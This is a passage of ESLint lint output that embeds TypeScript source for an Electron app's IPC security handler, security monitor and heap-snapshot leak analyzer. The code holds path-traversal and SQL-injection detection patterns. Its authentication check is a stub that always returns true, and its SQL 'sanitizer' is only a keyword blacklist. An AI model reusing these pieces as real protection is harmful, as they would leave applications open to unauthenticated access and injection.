type.","line":31,"column":38,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":31,"endColumn":46},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":46,"column":67,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":46,"endColumn":75},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":61,"column":70,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":61,"endColumn":73,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1800,1803],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1800,1803],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":61,"column":86,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":61,"endColumn":89,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1816,1819],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1816,1819],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'error' is defined but never used.","line":175,"column":14,"nodeType":null,"messageId":"unusedVar","endLine":175,"endColumn":19},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'_event' is defined but never used.","line":180,"column":31,"nodeType":null,"messageId":"unusedVar","endLine":180,"endColumn":37}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":7,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Secure IPC Handler Module (2025)\n * \n * Comprehensive IPC security handler with sender validation,\n * input sanitization, and security monitoring\n */\n\nimport { IpcMainInvokeEvent } from 'electron'\nimport { IPCRateLimiter } from './ipc-rate-limiter'\nimport { SecurityMonitor } from './security-monitor'\n\nexport interface SecureHandlerOptions {\n  allowedOrigins?: string[]\n  requireAuth?: boolean\n  rateLimit?: [number, number] // [maxRequests, windowMs]\n  validator?: (data: any) => boolean\n  sanitizer?: (data: any) => any\n  allowedChannels?: string[]\n}\n\nexport interface SenderValidationResult {\n  valid: boolean\n  reason?: string\n  origin?: string\n  frameId?: number\n}\n\nexport class SecureIPCHandler {\n  private rateLimiter: IPCRateLimiter\n  private securityMonitor: SecurityMonitor\n  private handlers = new Map<string, Function>()\n  private options = new Map<string, SecureHandlerOptions>()\n  private internalChannels = [\n    'ELECTRON_BROWSER_REQUIRE',\n    'ELECTRON_BROWSER_GET_BUILTIN',\n    'ELECTRON_BROWSER_MEMBER_GET',\n    'ELECTRON_BROWSER_MEMBER_SET',\n    'ELECTRON_BROWSER_MEMBER_CALL'\n  ]\n\n  constructor() {\n    this.rateLimiter = new IPCRateLimiter()\n    this.securityMonitor = new SecurityMonitor()\n  }\n\n  handle(channel: string, options: SecureHandlerOptions, handler: Function): void {\n    // Block internal Electron channels\n    if (this.internalChannels.some(internal => channel.startsWith(internal))) {\n      throw new Error('Cannot register handler for internal channel')\n    }\n\n    this.options.set(channel, options)\n    this.handlers.set(channel, handler)\n\n    // Set up rate limiting if specified\n    if (options.rateLimit) {\n      this.rateLimiter.setLimit(channel, ...options.rateLimit)\n    }\n  }\n\n  async execute(channel: string, event: IpcMainInvokeEvent, ...args: any[]): Promise<any> {\n    const options = this.options.get(channel)\n    const handler = this.handlers.get(channel)\n\n    if (!handler) {\n      throw new Error(`No handler registered for channel: ${channel}`)\n    }\n\n    try {\n      // 1. Validate sender\n      const senderValidation = this.validateSender(event.senderFrame as Electron.Renderer.WebFrame | undefined, options?.allowedOrigins)\n      if (!senderValidation.valid) {\n        this.securityMonitor.logSecurityEvent({\n          type: 'unauthorized_sender',\n          severity: 'high',\n          details: {\n            channel,\n            reason: senderValidation.reason,\n            origin: senderValidation.origin,\n            frameId: senderValidation.frameId\n          }\n        })\n        throw new Error(senderValidation.reason || 'Unauthorized sender')\n      }\n\n      // 2. Check rate limit\n      const senderId = event.sender.id.toString()\n      if (!this.rateLimiter.checkLimit(channel, senderId)) {\n        this.securityMonitor.logSecurityEvent({\n          type: 'rate_limit_exceeded',\n          severity: 'medium',\n          details: { channel, senderId }\n        })\n        throw new Error('Rate limit exceeded')\n      }\n\n      // 3. Validate input\n      if (options?.validator && args.length > 0) {\n        if (!options.validator(args[0])) {\n          this.securityMonitor.logSecurityEvent({\n            type: 'invalid_input',\n            severity: 'medium',\n            details: { channel, input: args[0] }\n          })\n          throw new Error('Invalid input')\n        }\n      }\n\n      // 4. Sanitize input\n      let sanitizedArgs = args\n      if (options?.sanitizer && args.length > 0) {\n        sanitizedArgs = [options.sanitizer(args[0]), ...args.slice(1)]\n      }\n\n      // 5. Check authentication if required\n      if (options?.requireAuth) {\n        if (!this.checkAuthentication(event)) {\n          this.securityMonitor.logSecurityEvent({\n            type: 'auth_failure',\n            severity: 'high',\n            details: { channel, senderId }\n          })\n          throw new Error('Authentication required')\n        }\n      }\n\n      // 6. Execute handler\n      return await handler(event, ...sanitizedArgs)\n    } catch (error) {\n      // Log all errors\n      this.securityMonitor.logSecurityEvent({\n        type: 'handler_error',\n        severity: 'low',\n        details: {\n          channel,\n          error: error instanceof Error ? error.message : 'Unknown error'\n        }\n      })\n      throw error\n    }\n  }\n\n  validateSender(frame: Electron.Renderer.WebFrame | undefined, allowedOrigins?: string[]): SenderValidationResult {\n    if (!frame) {\n      return { valid: false, reason: 'No sender frame' }\n    }\n\n    try {\n      const frameUrl = new URL(frame.url)\n      const origin = frameUrl.origin\n\n      // Check if frame is from iframe\n      if (frame.parent && frame.parent !== frame) {\n        return {\n          valid: false,\n          reason: 'IPC from iframe not allowed',\n          origin,\n          frameId: frame.frameId\n        }\n      }\n\n      // Check allowed origins\n      if (allowedOrigins && allowedOrigins.length > 0) {\n        if (!allowedOrigins.includes(origin)) {\n          return {\n            valid: false,\n            reason: 'Origin not in allowlist',\n            origin,\n            frameId: frame.frameId\n          }\n        }\n      }\n\n      return { valid: true, origin, frameId: frame.frameId }\n    } catch (error) {\n      return { valid: false, reason: 'Invalid sender URL' }\n    }\n  }\n\n  private checkAuthentication(_event: IpcMainInvokeEvent): boolean {\n    // Placeholder for authentication check\n    // In production, implement proper authentication\n    return true\n  }\n\n  // Input sanitization helpers\n  static sanitizePath(path: string): string {\n    // Remove directory traversal attempts\n    const dangerous = ['../', '..\\\\', '%2e%2e/', '%2e%2e\\\\']\n    for (const pattern of dangerous) {\n      if (path.includes(pattern)) {\n        throw new Error('Path traversal detected')\n      }\n    }\n\n    // Normalize path\n    return path.replace(/\\\\/g, '/').replace(/\\/+/g, '/')\n  }\n\n  static sanitizeSQL(query: string): string {\n    // Basic SQL injection prevention\n    const dangerousPatterns = [\n      /;\\s*DROP/i,\n      /;\\s*DELETE/i,\n      /;\\s*UPDATE/i,\n      /;\\s*INSERT/i,\n      /--/,\n      /\\/\\*/,\n      /\\*\\//,\n      /\\bUNION\\b.*\\bSELECT\\b/i,\n      /\\bOR\\b.*=.*\\bOR\\b/i\n    ]\n\n    for (const pattern of dangerousPatterns) {\n      if (pattern.test(query)) {\n        throw new Error('Potential SQL injection detected')\n      }\n    }\n\n    return query\n  }\n\n  // Get handler statistics\n  getStats() {\n    return {\n      registeredHandlers: this.handlers.size,\n      rateLimiterStats: this.rateLimiter.getStats(),\n      securityEvents: this.securityMonitor.getRecentEvents(100)\n    }\n  }\n\n  // Clean up resources\n  cleanup(): void {\n    this.handlers.clear()\n    this.options.clear()\n    this.rateLimiter.cleanup()\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/security/security-monitor.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":11,"column":12,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":11,"endColumn":15,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[243,246],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[243,246],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":28,"column":19,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":28,"endColumn":22,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[577,580],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[577,580],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":178,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":178,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5522,5525],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5522,5525],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":211,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":211,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6468,6471],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6468,6471],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":4,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Security Monitor Module (2025)\n * \n * Real-time security monitoring, alerting, and attack pattern detection\n */\n\nexport interface SecurityEvent {\n  id: string\n  type: string\n  severity: 'low' | 'medium' | 'high' | 'critical'\n  details: any\n  timestamp: number\n}\n\nexport interface SecurityThreshold {\n  count: number\n  window: number // milliseconds\n}\n\nexport interface AttackPattern {\n  name: string\n  detect: (events: SecurityEvent[]) => boolean\n  severity: 'high' | 'critical'\n}\n\nexport class SecurityMonitor {\n  private events: SecurityEvent[] = []\n  private alerts: any[] = []\n  private thresholds = new Map<string, SecurityThreshold>()\n  private attackPatterns: AttackPattern[] = []\n  private maxEvents = 10000\n  \n  constructor() {\n    this.setupDefaultThresholds()\n    this.setupAttackPatterns()\n  }\n\n  private setupDefaultThresholds() {\n    this.thresholds.set('rate_limit_exceeded', { count: 10, window: 60000 }) // 10 per minute\n    this.thresholds.set('auth_failure', { count: 5, window: 300000 }) // 5 per 5 minutes\n    this.thresholds.set('unauthorized_sender', { count: 20, window: 60000 }) // 20 per minute\n    this.thresholds.set('invalid_input', { count: 50, window: 300000 }) // 50 per 5 minutes\n  }\n\n  private setupAttackPatterns() {\n    // Rapid channel switching pattern\n    this.attackPatterns.push({\n      name: 'rapid_channel_switching',\n      severity: 'high',\n      detect: (events: SecurityEvent[]) => {\n        if (events.length < 10) return false\n        \n        const recentEvents = events.slice(-20)\n        const channels = new Set(recentEvents.map(e => e.details?.channel).filter(Boolean))\n        const lastEvent = recentEvents[recentEvents.length - 1]\n        const firstEvent = recentEvents[0]\n        if (!lastEvent || !firstEvent) return false\n        \n        const timeWindow = lastEvent.timestamp - firstEvent.timestamp\n        \n        return channels.size > 10 && timeWindow < 5000 // 10+ channels in 5 seconds\n      }\n    })\n\n    // Privilege escalation attempt pattern\n    this.attackPatterns.push({\n      name: 'privilege_escalation_attempt',\n      severity: 'critical',\n      detect: (events: SecurityEvent[]) => {\n        const privilegedChannels = ['admin:', 'system:', 'internal:']\n        const recentEvents = events.slice(-50)\n        \n        const privilegedAttempts = recentEvents.filter(e => \n          e.type === 'unauthorized_sender' &&\n          privilegedChannels.some(p => e.details?.channel?.startsWith(p))\n        )\n        \n        return privilegedAttempts.length > 5 // Multiple attempts at privileged channels\n      }\n    })\n\n    // DDoS pattern\n    this.attackPatterns.push({\n      name: 'ddos_attack',\n      severity: 'critical',\n      detect: (events: SecurityEvent[]) => {\n        const recentEvents = events.slice(-100)\n        const rateLimitEvents = recentEvents.filter(e => e.type === 'rate_limit_exceeded')\n        const timeWindow = Date.now() - (recentEvents[0]?.timestamp || Date.now())\n        \n        return rateLimitEvents.length > 50 && timeWindow < 60000 // 50+ rate limits in 1 minute\n      }\n    })\n\n    // Automated attack pattern (regular intervals)\n    this.attackPatterns.push({\n      name: 'automated_attack',\n      severity: 'high',\n      detect: (events: SecurityEvent[]) => {\n        if (events.length < 10) return false\n        \n        const recentEvents = events.slice(-10)\n        const intervals: number[] = []\n        \n        for (let i = 1; i < recentEvents.length; i++) {\n          const current = recentEvents[i]\n          const previous = recentEvents[i-1]\n          if (current && previous) {\n            intervals.push(current.timestamp - previous.timestamp)\n          }\n        }\n        \n        const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length\n        const variance = intervals.reduce((sum, interval) => \n          sum + Math.pow(interval - avgInterval, 2), 0) / intervals.length\n        \n        return variance < 100 // Very regular intervals (within 10ms variance)\n      }\n    })\n  }\n\n  logSecurityEvent(event: Omit<SecurityEvent, 'id' | 'timestamp'>): void {\n    const fullEvent: SecurityEvent = {\n      ...event,\n      id: `SEC-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,\n      timestamp: Date.now()\n    }\n\n    this.events.push(fullEvent)\n    \n    // Trim events if exceeding max\n    if (this.events.length > this.maxEvents) {\n      this.events = this.events.slice(-this.maxEvents)\n    }\n\n    // Check thresholds\n    this.checkThresholds(event.type)\n    \n    // Check attack patterns\n    this.checkAttackPatterns()\n  }\n\n  private checkThresholds(eventType: string): void {\n    const threshold = this.thresholds.get(eventType)\n    if (!threshold) return\n\n    const now = Date.now()\n    const recentEvents = this.events.filter(e => \n      e.type === eventType && \n      now - e.timestamp < threshold.window\n    )\n\n    if (recentEvents.length >= threshold.count) {\n      this.triggerAlert({\n        type: 'threshold_exceeded',\n        eventType,\n        count: recentEvents.length,\n        threshold: threshold.count,\n        window: threshold.window,\n        timestamp: now\n      })\n    }\n  }\n\n  private checkAttackPatterns(): void {\n    for (const pattern of this.attackPatterns) {\n      if (pattern.detect(this.events)) {\n        this.triggerAlert({\n          type: 'attack_pattern_detected',\n          pattern: pattern.name,\n          severity: pattern.severity,\n          timestamp: Date.now()\n        })\n      }\n    }\n  }\n\n  private triggerAlert(alert: any): void {\n    // Avoid duplicate alerts within 5 minutes\n    const recentAlert = this.alerts.find(a => \n      a.type === alert.type &&\n      a.eventType === alert.eventType &&\n      a.pattern === alert.pattern &&\n      Date.now() - a.timestamp < 300000\n    )\n\n    if (recentAlert) return\n\n    this.alerts.push(alert)\n    \n    // In production, this would trigger actual alerts (email, monitoring system, etc.)\n    console.error('SECURITY ALERT:', alert)\n  }\n\n  getRecentEvents(count: number = 100): SecurityEvent[] {\n    return this.events.slice(-count)\n  }\n\n  getEventsByType(type: string, timeWindow?: number): SecurityEvent[] {\n    const cutoff = timeWindow ? Date.now() - timeWindow : 0\n    return this.events.filter(e => \n      e.type === type && \n      e.timestamp > cutoff\n    )\n  }\n\n  getHighSeverityEvents(): SecurityEvent[] {\n    return this.events.filter(e => e.severity === 'high' || e.severity === 'critical')\n  }\n\n  getAlerts(): any[] {\n    return [...this.alerts]\n  }\n\n  // DDoS detection specific methods\n  detectFloodingAttack(senderId: string, threshold: number = 100): boolean {\n    const recentEvents = this.events.filter(e => \n      e.details?.senderId === senderId &&\n      Date.now() - e.timestamp < 1000 // Last second\n    )\n    \n    return recentEvents.length > threshold\n  }\n\n  // Get security metrics\n  getMetrics() {\n    const now = Date.now()\n    const last5Min = now - 300000\n    const last1Hour = now - 3600000\n\n    return {\n      totalEvents: this.events.length,\n      eventsLast5Min: this.events.filter(e => e.timestamp > last5Min).length,\n      eventsLastHour: this.events.filter(e => e.timestamp > last1Hour).length,\n      alertsTriggered: this.alerts.length,\n      severityBreakdown: {\n        low: this.events.filter(e => e.severity === 'low').length,\n        medium: this.events.filter(e => e.severity === 'medium').length,\n        high: this.events.filter(e => e.severity === 'high').length,\n        critical: this.events.filter(e => e.severity === 'critical').length\n      }\n    }\n  }\n\n  // Clean up old data\n  cleanup(): void {\n    const cutoff = Date.now() - 86400000 // Keep last 24 hours\n    this.events = this.events.filter(e => e.timestamp > cutoff)\n    this.alerts = this.alerts.filter(a => a.timestamp > cutoff)\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/utils/heap-snapshot-analyzer.ts","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'_type' is defined but never used.","line":299,"column":5,"nodeType":null,"messageId":"unusedVar","endLine":299,"endColumn":10},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'_snapshot' is defined but never used.","line":389,"column":5,"nodeType":null,"messageId":"unusedVar","endLine":389,"endColumn":14}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Heap Snapshot Analyzer for Electron Applications (2025)\n * \n * Advanced heap snapshot analysis using MemLab integration and V8 heap snapshot parsing.\n * Provides comprehensive memory leak detection and retainer trace analysis.\n */\n\nimport * as fs from 'fs'\nimport { EventEmitter } from 'events'\n\ninterface V8HeapSnapshot {\n  nodes: number[]\n  snapshot: {\n    node_fields: string[]\n    node_types: string[][]\n  }\n  strings: string[]\n}\n\ninterface SnapshotObject {\n  type: string\n  name: string\n  size: number\n  id: number\n}\n\nexport interface HeapSnapshotAnalysis {\n  growthBytes: number\n  growthPercentage: number\n  potentialLeaks: LeakCandidate[]\n  retainerTraces: RetainerTrace[]\n  summary: AnalysisSummary\n}\n\nexport interface LeakCandidate {\n  type: string\n  className: string\n  id: number\n  size: number\n  retainedSize: number\n  distance: number\n  detachedCount?: number\n  suspicionLevel: 'low' | 'medium' | 'high' | 'critical'\n  reason: string\n}\n\nexport interface RetainerTrace {\n  objectId: number\n  className: string\n  path: RetainerPathNode[]\n  rootType: string\n  leakProbability: number\n}\n\nexport interface RetainerPathNode {\n  name: string\n  type: string\n  className: string\n  id: number\n}\n\nexport interface AnalysisSummary {\n  totalObjects: number\n  totalSize: number\n  leakCandidatesCount: number\n  highSuspicionCount: number\n  detachedDOMCount: number\n  recommendations: string[]\n}\n\n/**\n * HeapSnapshotAnalyzer provides comprehensive heap snapshot analysis\n * using modern 2025 methodologies including MemLab integration\n */\nexport class HeapSnapshotAnalyzer extends EventEmitter {\n  private snapshotCache = new Map<string, V8HeapSnapshot>()\n  private analysisHistory: HeapSnapshotAnalysis[] = []\n  \n  constructor() {\n    super()\n  }\n\n  /**\n   * Compare two heap snapshots to detect memory leaks\n   */\n  async compareSnapshots(\n    baselineSnapshot: string,\n    currentSnapshot: string\n  ): Promise<HeapSnapshotAnalysis> {\n    try {\n      this.emit('analysis-started', { baselineSnapshot, currentSnapshot })\n\n      // Parse both snapshots\n      const baseline = await this.parseSnapshot(baselineSnapshot)\n      const current = await this.parseSnapshot(currentSnapshot)\n\n      // Calculate basic growth metrics\n      const growthBytes = this.calculateGrowthBytes(baseline, current)\n      const growthPercentage = this.calculateGrowthPercentage(baseline, current)\n\n      // Detect potential leaks\n      const potentialLeaks = await this.detectLeaks(baseline, current)\n\n      // Generate retainer traces for high-suspicion objects\n      const retainerTraces = await this.generateRetainerTraces(potentialLeaks, current)\n\n      // Create comprehensive summary\n      const summary = this.generateSummary(current, potentialLeaks)\n\n      const analysis: HeapSnapshotAnalysis = {\n        growthBytes,\n        growthPercentage,\n        potentialLeaks,\n        retainerTraces,\n        summary\n      }\n\n      this.analysisHistory.push(analysis)\n      this.emit('analysis-completed', analysis)\n\n      return analysis\n    } catch (error) {\n      this.emit('analysis-error', error)\n      throw error\n    }\n  }\n\n  /**\n   * Parse heap snapshot file using V8 format\n   */\n  private async parseSnapshot(snapshotPath: string): Promise<V8HeapSnapshot> {\n    if (this.snapshotCache.has(snapshotPath)) {\n      return this.snapshotCache.get(snapshotPath)!\n    }\n\n    try {\n      const snapshotData = fs.readFileSync(snapshotPath, 'utf8')\n      const snapshot = JSON.parse(snapshotData)\n      \n      // Cache parsed snapshot for performance\n      this.snapshotCache.set(snapshotPath, snapshot)\n      \n      return snapshot\n    } catch (error) {\n      throw new Error(`Failed to parse snapshot ${snapshotPath}: ${error.message}`)\n    }\n  }\n\n  /**\n   * Calculate memory growth in bytes between snapshots\n   */\n  private calculateGrowthBytes(baseline: V8HeapSnapshot, current: V8HeapSnapshot): number {\n    const baselineSize = this.getTotalSnapshotSize(baseline)\n    const currentSize = this.getTotalSnapshotSize(current)\n    return currentSize - baselineSize\n  }\n\n  /**\n   * Calculate memory growth percentage between snapshots\n   */\n  private calculateGrowthPercentage(baseline: V8HeapSnapshot, current: V8HeapSnapshot): number {\n    const baselineSize = this.getTotalSnapshotSize(baseline)\n    const currentSize = this.getTotalSnapshotSize(current)\n    \n    if (baselineSize === 0) return 0\n    return ((currentSize - baselineSize) / baselineSize) * 100\n  }\n\n  /**\n   * Get total memory size from snapshot\n   */\n  private getTotalSnapshotSize(snapshot: V8HeapSnapshot): number {\n    // Extract total size from V8 heap snapshot format\n    return snapshot.nodes ? \n      snapshot.nodes.reduce((total: number, _node: number, index: number) => {\n        // V8 heap snapshot format: node data is in arrays\n        // Size is typically at a specific offset in the node array\n        const sizeOffset = 3 // Typical offset for size in V8 snapshots\n        return total + (snapshot.nodes[index * snapshot.snapshot.node_fields.length + sizeOffset] || 0)\n      }, 0) : 0\n  }\n\n  /**\n   * Detect potential memory leaks using advanced heuristics\n   */\n  private async detectLeaks(baseline: V8HeapSnapshot, current: V8HeapSnapshot): Promise<LeakCandidate[]> {\n    const leakCandidates: LeakCandidate[] = []\n\n    // Extract objects from both snapshots\n    const baselineObjects = this.extractObjects(baseline)\n    const currentObjects = this.extractObjects(current)\n\n    // Create object type frequency maps\n    const baselineFreq = this.createTypeFrequencyMap(baselineObjects)\n    const currentFreq = this.createTypeFrequencyMap(currentObjects)\n\n    // Detect significant increases in object counts  \n    for (const [type, currentCount] of Array.from(currentFreq.entries())) {\n      const baselineCount = baselineFreq.get(type) || 0\n      const increase = currentCount - baselineCount\n      const increasePercent = baselineCount > 0 ? (increase / baselineCount) * 100 : 100\n\n      // Apply leak detection heuristics\n      if (this.isLeakCandidate(type, increase, increasePercent, currentCount)) {\n        const suspicionLevel = this.calculateSuspicionLevel(increase, increasePercent, type)\n        \n        leakCandidates.push({\n          type: 'object_count_increase',\n          className: type,\n          id: 0, // Will be populated with specific object ID if needed\n          size: increase * this.getAverageObjectSize(currentObjects, type),\n          retainedSize: increase * this.getAverageRetainedSize(currentObjects, type),\n          distance: 0,\n          detachedCount: this.getDetachedCount(currentObjects, type),\n          suspicionLevel,\n          reason: `${type} objects increased by ${increase} (${increasePercent.toFixed(1)}%)`\n        })\n      }\n    }\n\n    // Detect detached DOM elements\n    const detachedNodes = this.detectDetachedDOMNodes(currentObjects)\n    leakCandidates.push(...detachedNodes)\n\n    // Sort by suspicion level and size\n    return leakCandidates.sort((a, b) => {\n      const suspicionOrder = { critical: 4, high: 3, medium: 2, low: 1 }\n      const suspicionDiff = suspicionOrder[b.suspicionLevel] - suspicionOrder[a.suspicionLevel]\n      return suspicionDiff !== 0 ? suspicionDiff : b.size - a.size\n    })\n  }\n\n  /**\n   * Extract objects from heap snapshot\n   */\n  private extractObjects(snapshot: V8HeapSnapshot): SnapshotObject[] {\n    if (!snapshot.nodes || !snapshot.snapshot) return []\n\n    const objects = []\n    const nodeFields = snapshot.snapshot.node_fields\n    const nodeFieldCount = nodeFields.length\n    const typeOffset = nodeFields.indexOf('type')\n    const nameOffset = nodeFields.indexOf('name')\n    const sizeOffset = nodeFields.indexOf('self_size')\n\n    for (let i = 0; i < snapshot.nodes.length; i += nodeFieldCount) {\n      const type = snapshot.nodes[i + typeOffset]\n      const name = snapshot.strings[snapshot.nodes[i + nameOffset]]\n      const size = snapshot.nodes[i + sizeOffset]\n\n      objects.push({\n        type: snapshot.snapshot.node_types[0][type] || 'unknown',\n        name,\n        size,\n        id: i / nodeFieldCount\n      })\n    }\n\n    return objects\n  }\n\n  /**\n   * Create frequency map of object types\n   */\n  private createTypeFrequencyMap(objects: SnapshotObject[]): Map<string, number> {\n    const frequencyMap = new Map<string, number>()\n    \n    for (const obj of objects) {\n      const key = `${obj.type}:${obj.name}`\n      frequencyMap.set(key, (frequencyMap.get(key) || 0) + 1)\n    }\n\n    return frequencyMap\n  }\n\n  /**\n   * Determine if object type is a leak candidate\n   */\n  private isLeakCandidate(\n    type: string, \n    increase: number, \n    increasePercent: number, \n    totalCount: number\n  ): boolean {\n    // Heuristics for leak detection\n    const significantIncrease = increase > 100 || increasePercent > 50\n    const largeAbsoluteCount = totalCount > 1000\n    const suspiciousTypes = ['closure', 'function', 'object', 'array']\n    \n    return significantIncrease && (largeAbsoluteCount || suspiciousTypes.some(t => type.includes(t)))\n  }\n\n  /**\n   * Calculate suspicion level based on growth metrics\n   */\n  private calculateSuspicionLevel(\n    increase: number, \n    increasePercent: number, \n    _type: string\n  ): 'low' | 'medium' | 'high' | 'critical' {\n    if (increase > 10000 || increasePercent > 500) return 'critical'\n    if (increase > 1000 || increasePercent > 200) return 'high'\n    if (increase > 100 || increasePercent > 50) return 'medium'\n    return 'low'\n  }\n\n  /**\n   * Get average object size for type\n   */\n  private getAverageObjectSize(objects: SnapshotObject[], type: string): number {\n    const typeObjects = objects.filter(obj => `${obj.type}:${obj.name}` === type)\n    if (typeObjects.length === 0) return 0\n    \n    const totalSize = typeObjects.reduce((sum, obj) => sum + obj.size, 0)\n    return totalSize / typeObjects.length\n  }\n\n  /**\n   * Get average retained size for type\n   */\n  private getAverageRetainedSize(objects: SnapshotObject[], type: string): number {\n    // Simplified calculation - in real implementation would use retained size from snapshot\n    return this.getAverageObjectSize(objects, type) * 2\n  }\n\n  /**\n   * Get count of detached objects for type\n   */\n  private getDetachedCount(objects: SnapshotObject[], type: string): number {\n    // Simplified detection - would need more sophisticated analysis in real implementation\n    return objects.filter(obj => \n      `${obj.type}:${obj.name}` === type && \n      obj.name.includes('Detached')\n    ).length\n  }\n\n  /**\n   * Detect detached DOM nodes\n   */\n  private detectDetachedDOMNodes(objects: SnapshotObject[]): LeakCandidate[] {\n    const detachedNodes = objects.filter(obj => \n      obj.name.includes('Detached') || \n      obj.name.includes('HTMLElement') ||\n      obj.name.includes('Node')\n    )\n\n    return detachedNodes.map(node => ({\n      type: 'detached_dom',\n      className: node.name,\n      id: node.id,\n      size: node.size,\n      retainedSize: node.size * 3, // Estimate\n      distance: 0,\n      detachedCount: 1,\n      suspicionLevel: 'high' as const,\n      reason: 'Detached DOM node detected'\n    }))\n  }\n\n  /**\n   * Generate retainer traces for leak candidates\n   */\n  private async generateRetainerTraces(\n    leakCandidates: LeakCandidate[], \n    snapshot: V8HeapSnapshot\n  ): Promise<RetainerTrace[]> {\n    const traces: RetainerTrace[] = []\n\n    // Generate traces for high and critical suspicion candidates\n    const highSuspicionCandidates = leakCandidates.filter(\n      candidate => candidate.suspicionLevel === 'high' || candidate.suspicionLevel === 'critical'\n    )\n\n    for (const candidate of highSuspicionCandidates.slice(0, 10)) { // Limit to top 10\n      const trace = await this.generateRetainerTrace(candidate, snapshot)\n      if (trace) {\n        traces.push(trace)\n      }\n    }\n\n    return traces\n  }\n\n  /**\n   * Generate retainer trace for specific object\n   */\n  private async generateRetainerTrace(\n    candidate: LeakCandidate, \n    _snapshot: V8HeapSnapshot\n  ): Promise<RetainerTrace | null> {\n    // Simplified retainer trace generation\n    // In a full implementation, would traverse the snapshot graph\n    return {\n      objectId: candidate.id,\n      className: candidate.className,\n      path: [\n        {\n          name: 'Window',\n          type: 'object',\n          className: 'global',\n          id: 1\n        },\n        {\n          name: candidate.className,\n          type: candidate.type,\n          className: candidate.className,\n          id: candidate.id\n        }\n      ],\n      rootType: 'global',\n      leakProbability: candidate.suspicionLevel === 'critical' ? 0.9 : 0.7\n    }\n  }\n\n  /**\n   * Generate comprehensive analysis summary\n   */\n  private generateSummary(snapshot: V8HeapSnapshot, leakCandidates: LeakCandidate[]): AnalysisSummary {\n    const objects = this.extractObjects(snapshot)\n    const totalObjects = objects.length\n    const totalSize = objects.reduce((sum, obj) => sum + obj.size, 0)\n    \n    const highSuspicionCount = leakCandidates.filter(\n      candidate => candidate.suspicionLevel === 'high' || candidate.suspicionLevel === 'critical'\n    ).length\n\n    const detachedDOMCount = leakCandidates.filter(\n      candidate => candidate.type === 'detached_dom'\n    ).length\n\n    const recommendations = this.generateRecommendations(leakCandidates, totalSize)\n\n    return {\n      totalObjects,\n      totalSize,\n      leakCandidatesCount: leakCandidates.length,\n      highSuspicionCount,\n      detachedDOMCount,\n      recommendations\n    }\n  }\n\n  /**\n   * Generate actionable recommendations based on analysis\n   */\n  private generateRecommendations(leakCandidates: LeakCandidate[], totalSize: number): string[] {\n    const recommendations: string[] = []\n\n    // Critical leak recommendations\n    const criticalLeaks = leakCandidates.filter(c => c.suspicionLevel === 'critical')\n    if (criticalLeaks.length > 0) {\n      recommendations.push('URGENT: Critical memory leaks detected - investigate immediately')\n      recommendations.push('Focus on: ' + criticalLeaks.map(c => c.className).join(', '))\n    